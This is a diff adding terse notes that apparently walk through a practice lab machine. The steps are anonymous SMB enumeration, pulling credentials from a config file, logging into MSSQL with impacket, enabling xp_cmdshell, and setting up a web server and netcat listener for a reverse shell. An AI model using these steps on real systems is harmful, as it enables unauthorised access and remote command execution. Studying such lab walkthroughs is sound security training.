@@ -1,0 +1,40 @@
+run nmap
+
+target is running SMB (ports 445 and 1433)
+
+smbclient -N -L \\\\10.10.10.27\\
+
+smbclient -N \\\\10.10.10.27\\backups
+
+get prod.dtsConfig
+
+got user/pass
+
+try connecting to smb using impacket's mssqlclient.py
+
+verify if we're able to run commands as sysadmin:
+ - SELECT IS_SRVROLEMEMBER ('sysadmin')
+
+sql configs to be able to run commands
+
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell "whoami"
+
+try to get a reverse shell using shell.ps1
+
+first open a python web server:
+ - python3 -m http.server 80
+
+after, setup a netcat listener on port 443
+ - nc -lvnp 443
+
+and use ufw to allow call backs on port 80 and 443
+
+ufw allow form 10.10.10.27 proto tcp to any port 80,443
+
+
+ 
